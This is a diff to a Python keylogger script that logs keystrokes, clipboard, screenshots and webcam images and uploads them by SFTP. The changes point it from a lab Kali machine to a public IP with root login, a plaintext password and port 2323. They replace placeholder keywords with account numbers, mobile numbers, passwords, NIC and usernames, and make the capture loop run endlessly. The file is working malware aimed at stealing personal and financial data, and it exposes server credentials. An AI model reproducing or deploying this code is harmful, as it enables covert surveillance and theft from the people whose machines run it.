@@ -17,14 +17,14 @@ clipboard_information = "clipboard.txt"
 camera_information = ""
 screenshot_information = ""
 
-time_iterations = 10
+time_iterations = 300
 number_of_iterations_end = 1
 
-myHostname = "192.168.44.140"  # change this
-myUsername = "kali"  # change this
-myPassword = "kali"  # change this #should be 8 characters or more including special characters
-remote_file = '/home/kali/Desktop/log/'
-threat_file = '/home/kali/Desktop/threat/'
+myHostname = "139.59.41.58"  # change this
+myUsername = "root"  # change this
+myPassword = "#1Appliedproject"  # change this #should be 8 characters or more including special characters
+log_dir = '/home/keylogger_log/log/'
+threat_dir = '/root/threat/'
 
 i = 0  # global variable to change the name of image as we click
 
@@ -91,10 +91,10 @@ def encrypt_files():
 
 # Sftp the files to server
 def sftp_files_threat():
-    with pysftp.Connection(host=myHostname, username=myUsername, password=myPassword) as sftp:
+    with pysftp.Connection(host=myHostname, port=2323, username=myUsername, password=myPassword) as sftp:
         try:
             print("Connection Successfully Established")
-            sftp.chdir(threat_file)
+            sftp.chdir(threat_dir)
             time_str = time.strftime("Threat_%Y_%m_%d_%H:%M")  # creates a time stamp to be used
             sftp.mkdir(time_str)  # Creates a directory in the server with the time stamp as the name
             print("Directory created")
@@ -109,10 +109,10 @@ def sftp_files_threat():
 
 
 def sftp_files_log():
-    with pysftp.Connection(host=myHostname, username=myUsername, password=myPassword) as sftp:
+    with pysftp.Connection(host=myHostname, port=2323, username=myUsername, password=myPassword) as sftp:
         try:
             print("Connection Successfully Established")
-            sftp.chdir(remote_file)
+            sftp.chdir(log_dir)
             time_str = time.strftime("Log_%Y_%m_%d_%H:%M")  # creates a time stamp to be used
             sftp.mkdir(time_str)  # Creates a directory in the server with the time stamp as the name
             print("Directory created")
@@ -139,7 +139,7 @@ def delete_files():
 
 # Read the log file to find any mentioned threats
 def read_file():
-    string1 = ['quick', 'brown', 'fox', 'jumps']  # mentioned threats
+    string1 = ['Account number', 'Mobile number', 'password', 'gender', 'NIC', 'username']  # mentioned threats
     # open text file
     with open(file_path + keys_information, "r") as logfiles:
         for line in logfiles:
@@ -254,7 +254,7 @@ while number_of_iterations < number_of_iterations_end:  # The keylogger will run
         capture_webcam()
         read_file()
 
-        number_of_iterations += 1
+        number_of_iterations += -1
 
         currentTime = time.time()
         stopTime = time.time() + time_iterations
